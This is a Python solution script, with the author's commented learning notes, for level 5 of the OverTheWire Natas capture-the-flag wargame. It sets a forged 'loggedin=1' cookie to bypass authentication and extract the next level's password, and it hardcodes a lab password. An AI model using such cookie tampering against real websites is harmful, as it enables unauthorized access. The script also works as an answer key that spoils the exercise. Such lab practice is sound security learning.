#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'
"""———————————————————————————————————————"""
url = 'http://%s.natas.labs.overthewire.org/' % username
print(url) #make sure the URL works fine

"""Starting with our defaul stuff
response = requests.get(url, auth = (username, password))
content = response.text
print(content) returns "Access disallowed. You are not logged in"
But it shows us passing our username and password?
It seems to be a persistence thing.... Hey, look at this: https://requests.readthedocs.io/en/latest/user/advanced/#session-objects
"""
session = requests.Session()
#request = session.get(url, auth = (username, password))
#print(request.text)
"""This doesn't seem to be doing much for us, looks pretty much the same,
Reading the link above it mentions cookies a bunch, cookies are for sesions, so what about that?
We must be able to do something with the cookies in Python, right? But those have to be built into the page.. oh hey
https://www.geeksforgeeks.org/retrieving-cookies-in-python/


Note: the next 3 lines need to be commented out for the below to pass properly"""
#response = session.get(url, auth = (username, password))
#print(session.cookies.get_dict)
#print(session.cookies)#just playing around, similar output but maybe this one is simpler

"""Notice: <RequestsCookieJar[<Cookie loggedin=0 for natas5.natas.labs.overthewire.org/>]>
Sooo, there's a logged in cookie? Looks like the value is - which is probably not good https://www.w3schools.com/python/python_booleans.asp
I'm guessing we can just pass a value of 1/true?
cookies also use a dictionary type

From that first link above, it looks like we can pass something like: cookies={'from-my': 'browser'} """
#response = session.get(url, auth = (username, password), cookies={ "loggedin" : "1" })

"""I think a 'more official' way of doing this would be to put that into a dictionary variable and then pass that instead"""
cookies = { "loggedin" : "1" }
response = session.get(url, auth = (username, password), cookies = cookies)
content = response.text
print(content)

print(re.findall('Access granted. The password for natas6 is (.*)</div>', content))
#SDG